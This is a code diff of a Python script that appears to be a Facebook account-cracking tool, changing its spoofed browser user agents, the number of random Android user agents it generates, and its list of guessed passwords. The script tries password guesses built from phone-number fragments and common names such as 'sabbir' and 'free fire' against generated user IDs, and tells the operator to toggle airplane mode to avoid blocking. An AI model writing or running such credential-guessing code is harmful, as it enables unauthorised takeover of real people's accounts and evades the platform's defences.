@@ -118,12 +118,12 @@ loop = 0
 url_lookup = "https://lookup-id.com/"
 url_mb = "https://m.facebook.com"
 url_ip = "https://www.httpbin.org/ip"
-header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
+header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1_15 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15A372 Safari/604.1 [FBAN/EMA;FBLC/en_US;FBAV/239.0.0.10.109;]"}
 bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
 done = False
 
 ugen=[]
-for x in range(5000):
+for x in range(1000):
     aa='Mozilla/5.0 (Linux; U; Android'
     b=random.choice(['6','7','8','9','10','11','12'])
     c=' en-us; GT-'
@@ -227,7 +227,7 @@ def RJ_SN():
         print('\033[1;92mIF ID NOT COME TURN ON AIRPLNE')
         linex()
         for love in user:
-            pwx = [love[2:],love,code+love,code+love[:3],'free fire','Free Fire','gaming','sabbir@@']
+            pwx = [love[2:],love,code+love,code+love[:3],'sadiya','sumaiya','sabbir','nusrat','ariyan','free fire']
             uid = code+love
             manshera.submit(rcrack,uid,pwx,tl)
     print('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;90mCRACK PROCESS HAS BEEN COMPLETED ')
